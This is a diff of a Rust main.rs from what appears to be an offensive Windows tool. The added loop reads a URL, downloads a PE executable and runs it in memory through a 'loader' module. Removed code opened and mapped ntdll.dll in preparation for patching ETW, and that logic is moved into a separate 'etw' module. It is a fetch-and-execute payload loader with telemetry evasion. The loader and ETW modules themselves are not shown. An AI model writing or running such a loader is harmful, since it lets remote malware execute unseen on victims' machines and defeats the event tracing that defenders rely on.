@@ -1,88 +1,14 @@
-use windows::Win32::Storage::FileSystem::*;
-use windows::{core::*, Win32::Foundation::*};    
-use  windows::Win32::System::Memory::*;
 use url::Url;
 
-mod fetch;
+mod etw;
 mod error;
-
-fn __new_ntdll_patch_etw()->Result<()>{
-    // Path to NTDLL
-    let ntdll_path = r"C:\Windows\System32\ntdll.dll";
-    println!("[i] NTDLL Path:\t{}", ntdll_path);
-    let ntdll_path: PCSTR = PCSTR(b"C:\\Windows\\System32\\ntdll.dll\0"[..].as_ptr() as *const u8);
-
-    // Acquire the handle to NTDLL
-    let hfile: HANDLE;
-    unsafe{
-        hfile = match CreateFileA(
-            ntdll_path,
-            FILE_ACCESS_FLAGS(windows::Win32::System::SystemServices::GENERIC_READ),
-            FILE_SHARE_READ,
-            None,
-            OPEN_EXISTING,
-            FILE_FLAGS_AND_ATTRIBUTES(0u32),
-            None) {
-                Ok(_res) => _res,
-                Err(e) => {
-                    eprintln!("Error occured as: {}({:?})", e, GetLastError());
-                    return Err(e)
-                }
-            };
-        }   
-
-    // Check if handle is valid
-    if hfile==INVALID_HANDLE_VALUE {
-        let _err:  WIN32_ERROR;        
-        unsafe{
-            _err = GetLastError();
-        }    
-        eprintln!("Failed to acquire Handle to ntdll.dll({:?})", _err);
-        let _err = _err.to_hresult();
-        return Err(Error::new(_err, _err.message()));
-    }
-    
-    println!("[i] Acquired Handle to ntdll.dll");
-
-    // Prepare file mapping
-    let _hfile_mapping: HANDLE;
-    unsafe {
-        _hfile_mapping = match CreateFileMappingA(
-            hfile,
-            None,
-            PAGE_READONLY | SEC_IMAGE,
-            0u32,
-            0u32,
-            PCSTR(std::ptr::null_mut() as *const u8)){
-                Ok(_handle)=>_handle,
-                Err(e)=>{
-                    let _err:  WIN32_ERROR;        
-                    _err = GetLastError();    
-                    eprintln!("Error occured while acquiring File Handle: ({:?})", _err);
-                    eprintln!("Error: {}", e);
-                    let _err = _err.to_hresult();
-                    return Err(Error::new(_err, _err.message()));
-                }
-            };
-        }
-    if _hfile_mapping.is_invalid(){
-        eprintln!("Invalid File Mapping!");
-        let _err:  WIN32_ERROR;        
-        unsafe {_err = GetLastError();}    
-        eprintln!("Error occured while acquiring File Handle: ({:?})", _err);
-        let _err = _err.to_hresult();
-        return Err(Error::new(_err, _err.message()));
-    }
-    Ok(())
-}
-
-
+mod fetch;
+mod loader;
 
 fn main(){
     println!("[>] Exe who?");
     //new_ntdll_patch_etw().expect("Patching not okie");
     loop {
-        let mut pe_buf: Vec<u8> = Vec::new();
         println!();
         let url_str = match fetch::fetch_url(){
             Ok(_res) => _res,
@@ -111,7 +37,7 @@ fn main(){
         };
 
         // Fetch PE
-        pe_buf = match fetch::fetch_pe(url) {
+        let pe_buf = match fetch::fetch_pe(url) {
             Ok(_v) => _v,
             Err(e) => {
                 eprintln!("[!] Error occurred as: {}", e);
@@ -119,7 +45,16 @@ fn main(){
             }
         };
 
-        println!("[i] Received PE Size: {}", pe_buf.len());
+        // Load PE
+        match loader::load_pe(pe_buf){
+            Ok(_) => {
+                println!("[i] Execution Successful");
+            },
+            Err(e) => {
+                eprintln!("[!] Error occured as: {}", e);
+                continue;
+            }
+        }
 
     }
 
